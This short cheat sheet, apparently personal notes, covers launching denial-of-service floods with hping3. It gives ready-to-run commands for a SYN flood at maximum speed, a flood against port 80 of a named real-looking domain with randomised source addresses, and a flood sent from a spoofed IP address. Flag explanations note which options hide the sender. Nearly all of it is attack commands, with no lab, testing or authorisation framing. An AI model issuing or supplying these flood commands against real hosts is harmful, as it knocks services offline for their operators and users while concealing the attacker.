# DOS Flood with Hping3


sudo apt install hping3 -y

`sudo hping3 -S --flood -V -p <port> <ip>`
  
Flood Using SYN Packets Against Port 80
  
`sudo hping3 lacampora.org -q -n -d 120 -S -p 80 --flood --rand-source`
  
-q: brief output
-n: shows target IP instead of host.
-d 120: sets packet size
–rand-source: hides IP address.
-S: specifies SYN packets.
–flood: replies will be ignored and packets will be sent as fast as possible.
-V: Verbosity.
-p: port
  
  
Flood From a Fake IP Address With hping3
  
`sudo hping3 -a 190.0.174.10 190.0.175.100 -S -q -p 80`
  
  
–interface: wlan0 or whatever network card name you have.
  
More info in article https://linuxhint.com/hping3/
